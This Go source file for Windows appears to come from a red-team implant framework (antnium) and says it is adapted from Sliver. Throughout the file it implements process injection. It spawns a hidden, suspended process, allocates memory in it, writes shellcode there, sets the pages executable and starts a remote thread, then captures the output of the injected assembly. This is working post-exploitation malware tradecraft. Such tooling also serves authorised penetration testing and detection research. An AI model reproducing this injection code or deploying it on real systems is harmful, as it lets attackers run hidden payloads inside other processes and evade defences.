// +build windows

package arch

import (
	"bytes"
	"fmt"

	"log"
	"os/exec"
	"strings"
	"time"

	"github.com/dobin/antnium/pkg/syscalls"
	"golang.org/x/sys/windows"
)

// Inspired/copied from sliver: https://github.com/BishopFox/sliver, GPL-3.0

// injectTask - Injects shellcode into a process handle
func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
	var (
		err          error
		remoteAddr   uintptr
		threadHandle windows.Handle
	)
	dataSize := len(data)
	// Remotely allocate memory in the target process
	// {{if .Config.Debug}}
	log.Println("allocating remote process memory ...")
	// {{end}}
	if rwxPages {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	} else {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	}
	// {{if .Config.Debug}}
	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
	// {{end}}
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("[!] failed to allocate remote process memory")
		// {{end}}
		return threadHandle, err
	}

	// Write the shellcode into the remotely allocated buffer
	var nLength uintptr
	err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength)
	// {{if .Config.Debug}}
	log.Printf("writeprocessmemory returned: err = %v", err)
	// {{end}}
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[!] failed to write data into remote process")
		// {{end}}
		return threadHandle, err
	}
	if !rwxPages {
		var oldProtect uint32
		// Set proper page permissions
		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			//{{if .Config.Debug}}
			log.Println("VirtualProtectEx failed:", err)
			//{{end}}
			return threadHandle, err
		}
	}
	// Create the remote thread to where we wrote the shellcode
	// {{if .Config.Debug}}
	log.Println("successfully injected data, starting remote thread ....")
	// {{end}}
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
	threadHandle, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
	// {{if .Config.Debug}}
	log.Printf("createremotethread returned:  err = %v", err)
	// {{end}}
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[!] failed to create remote thread")
		// {{end}}
		return threadHandle, err
	}
	return threadHandle, nil
}

func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
	cmd := exec.Command(proc)
	cmd.SysProcAttr = &windows.SysProcAttr{
		//Token: syscall.Token(CurrentToken),
	}
	cmd.Stdout = stdout
	cmd.Stderr = stderr
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	if suspended {
		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
	}
	err := cmd.Start()
	if err != nil {
		return nil, err
	}
	return cmd, nil
}

func ExecuteAssembly(data []byte, process string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
	var (
		stdoutBuf, stderrBuf bytes.Buffer
		lpTargetHandle       windows.Handle
	)
	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
	if err != nil {
		return nil, nil, 0, 0, fmt.Errorf("Could not start process: %s", process)
	}
	pid = cmd.Process.Pid
	//log.Printf("[*] %s started, pid = %d\n", process, pid)
	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
	if err != nil {
		return nil, nil, 0, 0, fmt.Errorf("OpenProcess failed: %s", err)
	}
	defer windows.CloseHandle(handle)
	defer windows.CloseHandle(lpTargetHandle)
	currentProcHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return nil, nil, 0, 0, fmt.Errorf("GetCurrentProcess failed")
	}
	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
	if err != nil {
		return nil, nil, 0, 0, fmt.Errorf("DuplicateHandle failed: %s", err)
	}
	threadHandle, err := injectTask(lpTargetHandle, data, false)
	if err != nil {
		return nil, nil, 0, 0, fmt.Errorf("injectTask failed: %s", err)
	}
	err = waitForCompletion(threadHandle)
	if err != nil {
		return nil, nil, 0, 0, fmt.Errorf("waitForCompletion failed: %s", err)
	}
	err = cmd.Process.Kill()
	if err != nil {
		return stdoutBuf.Bytes(), stderrBuf.Bytes(), pid, 0, fmt.Errorf("Kill failed: %s", err)
	}
	return stdoutBuf.Bytes(), stderrBuf.Bytes(), pid, 0, nil
}

func waitForCompletion(threadHandle windows.Handle) error {
	for {
		var code uint32
		err := syscalls.GetExitCodeThread(threadHandle, &code)
		// log.Println(code)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			// {{if .Config.Debug}}
			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
			// {{end}}
			return err
		}
		// {{if .Config.Debug}}
		log.Printf("[!] Error: %v, code: %d\n", err, code)
		// {{end}}
		if code == syscalls.STILL_ACTIVE {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	return nil
}
